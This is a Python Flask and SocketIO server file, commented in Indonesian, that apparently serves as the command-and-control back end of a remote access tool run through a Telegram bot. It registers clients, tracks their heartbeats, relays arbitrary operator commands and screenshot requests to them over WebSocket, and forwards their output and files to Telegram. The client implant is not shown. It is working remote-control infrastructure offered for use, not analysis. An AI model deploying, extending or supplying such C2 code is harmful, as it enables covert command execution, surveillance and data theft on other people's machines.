# server.py
import os
import json
import time
import threading
import requests
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import sqlite3
from datetime import datetime

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Konfigurasi
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
DATABASE_URL = "clients.db"

# Fungsi untuk memastikan database dan tabel ada
def ensure_db_exists():
    try:
        conn = sqlite3.connect(DATABASE_URL)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT UNIQUE,
                name TEXT,
                last_seen TEXT,
                status TEXT
            )
        ''')
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error ensuring database exists: {e}")

# Pastikan database ada sebelum menerima request
@app.before_request
def before_request():
    ensure_db_exists()

# Inisialisasi database
def init_db():
    conn = sqlite3.connect(DATABASE_URL)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT UNIQUE,
            name TEXT,
            last_seen TEXT,
            status TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Pastikan database diinisialisasi saat aplikasi dimulai
with app.app_context():
    init_db()

# Fungsi untuk mengirim pesan ke Telegram
def send_to_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': text}
    try:
        response = requests.post(url, data=data, timeout=10)
        return response.ok
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

# Fungsi untuk mengirim file ke Telegram
def send_file_to_telegram(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
        return response.ok
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")
        return False

# Endpoint untuk client mendaftar
@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    name = data.get('name')
    
    if not client_id or not name:
        return jsonify({'error': 'Missing client_id or name'}), 400
    
    conn = sqlite3.connect(DATABASE_URL)
    cursor = conn.cursor()
    
    # Perbarui atau tambahkan client
    cursor.execute('''
        INSERT OR REPLACE INTO clients (client_id, name, last_seen, status)
        VALUES (?, ?, ?, ?)
    ''', (client_id, name, datetime.now().isoformat(), 'online'))
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# Endpoint untuk client update status
@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    client_id = data.get('client_id')
    
    if not client_id:
        return jsonify({'error': 'Missing client_id'}), 400
    
    conn = sqlite3.connect(DATABASE_URL)
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE clients SET last_seen = ?, status = ? WHERE client_id = ?
    ''', (datetime.now().isoformat(), 'online', client_id))
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# WebSocket untuk komunikasi real-time
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('register')
def handle_register(data):
    client_id = data.get('client_id')
    name = data.get('name')
    
    # Simpan ke database
    conn = sqlite3.connect(DATABASE_URL)
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT OR REPLACE INTO clients (client_id, name, last_seen, status)
        VALUES (?, ?, ?, ?)
    ''', (client_id, name, datetime.now().isoformat(), 'online'))
    
    conn.commit()
    conn.close()
    
    emit('registered', {'success': True})

@socketio.on('command_result')
def handle_command_result(data):
    client_id = data.get('client_id')
    result = data.get('result')
    chat_id = data.get('chat_id')
    
    # Kirim hasil ke Telegram
    if chat_id:
        if result.get('type') == 'text':
            send_to_telegram(chat_id, result.get('data'))
        elif result.get('type') == 'file':
            send_file_to_telegram(chat_id, result.get('file_path'), result.get('caption'))

# Endpoint untuk menerima webhook dari Telegram
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    data = request.json
    
    # Proses pesan dari Telegram
    if 'message' in data:
        message = data['message']
        chat_id = message['chat']['id']
        text = message.get('text', '')
        
        # Parse perintah
        if text.startswith('/'):
            command_parts = text.split(' ', 1)
            command = command_parts[0].lower()
            params = command_parts[1] if len(command_parts) > 1 else ''
            
            # Proses perintah
            if command == '/help':
                help_text = (
                    "Perintah yang tersedia:\n"
                    "/listclients - Lihat semua client terdaftar\n"
                    "/sendcommand_(clientid)_(command) - Kirim perintah ke client\n"
                    "/screenshot_(clientid) - Ambil screenshot dari client\n"
                    "/info - Informasi server"
                )
                send_to_telegram(chat_id, help_text)
            
            elif command == '/listclients':
                conn = sqlite3.connect(DATABASE_URL)
                cursor = conn.cursor()
                cursor.execute('SELECT client_id, name, last_seen, status FROM clients')
                clients = cursor.fetchall()
                conn.close()
                
                if clients:
                    response = "Daftar client:\n"
                    for client in clients:
                        response += f"ID: {client[0]}, Name: {client[1]}, Last Seen: {client[2]}, Status: {client[3]}\n"
                else:
                    response = "Tidak ada client terdaftar"
                
                send_to_telegram(chat_id, response)
            
            elif command.startswith('/sendcommand_'):
                try:
                    # Format: /sendcommand_clientid_command
                    parts = command.split('_', 2)
                    if len(parts) >= 3:
                        client_id = parts[1]
                        cmd = parts[2]
                        
                        # Kirim perintah ke client via WebSocket
                        socketio.emit('execute_command', {
                            'client_id': client_id,
                            'command': cmd,
                            'chat_id': chat_id
                        })
                        
                        send_to_telegram(chat_id, f"Perintah '{cmd}' dikirim ke client {client_id}")
                except Exception as e:
                    send_to_telegram(chat_id, f"Error: {str(e)}")
            
            elif command.startswith('/screenshot_'):
                try:
                    client_id = command.split('_', 1)[1]
                    
                    # Kirim perintah screenshot ke client
                    socketio.emit('execute_command', {
                        'client_id': client_id,
                        'command': 'screenshot',
                        'chat_id': chat_id
                    })
                    
                    send_to_telegram(chat_id, f"Perintah screenshot dikirim ke client {client_id}")
                except Exception as e:
                    send_to_telegram(chat_id, f"Error: {str(e)}")
            
            elif command == '/info':
                info_text = (
                    "Server Information:\n"
                    f"Time: {datetime.now().isoformat()}\n"
                    f"Connected clients: {get_client_count()}"
                )
                send_to_telegram(chat_id, info_text)
    
    return jsonify({'success': True})

def get_client_count():
    conn = sqlite3.connect(DATABASE_URL)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM clients WHERE status = "online"')
    count = cursor.fetchone()[0]
    conn.close()
    return count

# Thread untuk mengecek status client
def check_client_status():
    while True:
        time.sleep(60)  # Cek setiap menit
        
        conn = sqlite3.connect(DATABASE_URL)
        cursor = conn.cursor()
        
        # Update status client yang tidak terlihat dalam 5 menit
        cursor.execute('''
            UPDATE clients SET status = 'offline' 
            WHERE datetime(last_seen) < datetime('now', '-5 minutes')
        ''')
        
        conn.commit()
        conn.close()

if __name__ == '__main__':
    # Start status checker thread
    status_thread = threading.Thread(target=check_client_status)
    status_thread.daemon = True
    status_thread.start()
    
    # Jalankan server
    port = int(os.environ.get('PORT', 10000))
    socketio.run(app, host='0.0.0.0', port=port)

